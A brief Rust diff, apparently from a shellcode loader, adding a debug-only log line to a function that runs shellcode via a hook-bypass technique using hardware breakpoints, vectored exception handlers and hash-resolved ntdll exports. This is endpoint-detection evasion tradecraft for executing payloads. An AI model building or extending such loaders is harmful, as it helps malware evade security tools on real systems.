@@ -31,6 +31,9 @@ fn execute_with_hwbp(ntdll: *mut u8, func_hash: u32, callback: &mut dyn FnMut(*m
 
 #[cfg(feature = "run_hook_bypass")]
 pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
+    #[cfg(feature = "debug")]
+    crate::utils::print_message("Executing via Hook Bypass...");
+
     let ntdll = get_loaded_module_by_hash(NTDLL_HASH).ok_or("Failed to get ntdll")?;
 
     let rtl_add_veh_addr = get_export_by_hash(ntdll, RTL_ADD_VEH_HASH).ok_or("VEH API not found")?;
